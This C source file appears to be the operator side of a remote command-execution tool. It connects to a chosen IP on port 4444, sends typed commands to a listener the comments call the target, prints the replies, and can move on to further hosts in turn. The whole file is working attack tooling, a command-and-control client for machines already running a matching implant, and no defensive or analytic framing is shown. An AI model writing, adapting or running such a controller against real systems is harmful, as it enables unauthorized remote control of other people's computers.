#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <poll.h>

#define BUFFER_LEN 8192  // Length in bytes of the messages which can be sent and received by the socket
#define IP_CHAR_LEN 20   // The length of IP address with additional integers from a newline character and null terminator

/*
  Name of Function: createSocket(char* ip_address, int port)
  Parameters in Function: char* ip_address, the IP address which the socket will be connected to
                          int port, the port which the socket will be connected to 
  Return of Function: int, the socket's file descriptor
  Purpose of Function: Initializes the attacker socket, prompts for an inputted message, and sends it to the listener
*/
int createSocket(char* ip_address, int port){
  ip_address = strtok(ip_address, " \n");  // Strips the ip_address of any spaces or new lines

  int listener_socket = -1;                 // // Initializes the listener socket integer
  listener_socket = socket(AF_INET, SOCK_STREAM, 0); // Creates a listener socket which is an IPv4 running over TCP
 
  struct sockaddr_in listener_addr; // Initializes a socket address

  listener_addr.sin_family = AF_INET; // Sets the socket address family to IPv4
  listener_addr.sin_port = htons(port); // Sets the port number to communicate over based on the parameter inputted
  listener_addr.sin_addr.s_addr = inet_addr(ip_address); // // Sets the IP address to communicate over based on the parameter inputted

  if(connect(listener_socket, (struct sockaddr*) &listener_addr, sizeof(listener_addr)) < 0){
    perror("Connect failed.\n");  // If success is less than zero, meaning it failed, it prints out "Connect failed" to what was stderr (now attacker socket) 
    exit(1);               // Exits with exit code 1 (container shutdown either because of a failure or invalid file)
  }

  return listener_socket;    // Returns the file descriptor called listener socket
}

/*
  Name of Function: main(void)
  Parameters in Function: none
  Return of Function: int, 0 if successful
  Purpose of Function: Prompt the user for IP address and the port to connect to, makes the connection, then allows for execution of commands on the IP address
  NOTE FROM THE AUTHOR: If you type "quit" and click enter, it will reprompt for a new IP address and port, meaning you can connect to multiple IP addresses, one-at-a-time
*/
int main(void){
  while(1){ 
    char ip[IP_CHAR_LEN]; // Initializes a string of the buffer length called ip
    printf("\nWhat IP address would you like to connect to?\t"); // Prints out: "What IP address would you like to connect to?    "
    fgets(ip, IP_CHAR_LEN, stdin); // Receives the input from stdin with length IP_CHAR_LEN and stores it in ip
    fflush(stdin);  // Clears the output buffer
  
    int port = 4444;
  
    int socket = createSocket(ip, port);  // Creates a socket and receives a file descriptor stored in 'socket'
  
    char msg[BUFFER_LEN];        // Initializes a string of the buffer length called msg
    memset(msg, 0, BUFFER_LEN);  // Sets all of the bytes of msg to 0
  
    printf("Enter the command you would like to execute:\t");  // Prints out: "Enter command you would like to enter:   "
    fgets(msg, BUFFER_LEN, stdin);                       // Receives the input from stdin with length BUFFER_LEN and stores it in msg
    while(strcmp(msg, "quit\n") != 0){
        fflush(stdin);                                 // Clears the output buffer
        send(socket, msg, BUFFER_LEN, 0);              // Sends the message from the attacker socket, which was msg
  
        struct pollfd polling = {socket, POLLIN, 0};   // Creates a poll struct called polling 
        while(poll(&polling, 1, 1000) > 0){             // Sees if a file descriptor has something to read, timeout is 500 milliseconds because we're trying to wait for data to come in
        recv(socket, msg, BUFFER_LEN, 0);              // Receives the input from the socket with length BUFFER_LEN and stores it in msg
        printf("%s", msg);                             // Prints msg, or what was received from the listener socket
        memset(msg, 0, BUFFER_LEN);                    // Sets all of the bytes of msg to 0
      }
  
      printf("\nEnter the command you would like to execute:\t");   // 
      fgets(msg, BUFFER_LEN, stdin);          // Receives the input from stdin with length BUFFER_LEN and stores it in msg
    }
    send(socket, msg, BUFFER_LEN, 0);   // Sends the message from the attacker socket, which was msg
    close(socket);                      // Closes the attacker's socket
  }
  return 0;  // If successful, the function returns 0
}

